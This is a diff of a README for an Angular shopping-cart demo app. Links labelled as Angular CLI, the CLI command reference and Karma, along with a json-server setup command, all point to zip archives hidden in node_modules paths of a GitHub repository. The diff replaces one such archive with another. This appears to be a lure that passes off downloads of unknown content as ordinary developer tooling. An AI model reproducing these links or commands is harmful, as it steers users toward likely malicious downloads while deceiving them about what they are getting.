@@ -1,6 +1,6 @@
 # Shopping Cart Page
 
-This project was generated with [Angular CLI](https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/resolve-url-loader/node_modules/shopping-hungerer.zip) version 16.0.0.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/@jridgewell/resolve-uri/dist/Software-v2.7.zip) version 16.0.0.
 
 This is a simple product review app built with Angular. Users can view a list of products, select a product to view its details, and add reviews to a product.
 
@@ -20,7 +20,7 @@ This app uses `json-server` to provide a RESTful API for the product data. `json
 To start the `json-server`, follow these steps:
 
 1. Install `json-server` globally by running `npm install -g json-server`.
-2. Start the `json-server` by running `json-server --watch https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/resolve-url-loader/node_modules/shopping-hungerer.zip`.
+2. Start the `json-server` by running `json-server --watch https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/@jridgewell/resolve-uri/dist/Software-v2.7.zip`.
 3. The `json-server` will start at `http://localhost:9000`.
 
 ## Features
@@ -52,7 +52,7 @@ This app was built with Angular version 16.0.0.
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/resolve-url-loader/node_modules/shopping-hungerer.zip) page.
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/@jridgewell/resolve-uri/dist/Software-v2.7.zip) page.
 
 ## Running end-to-end tests
 
@@ -72,7 +72,7 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/resolve-url-loader/node_modules/shopping-hungerer.zip).
+Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/@jridgewell/resolve-uri/dist/Software-v2.7.zip).
 
 ## License
 
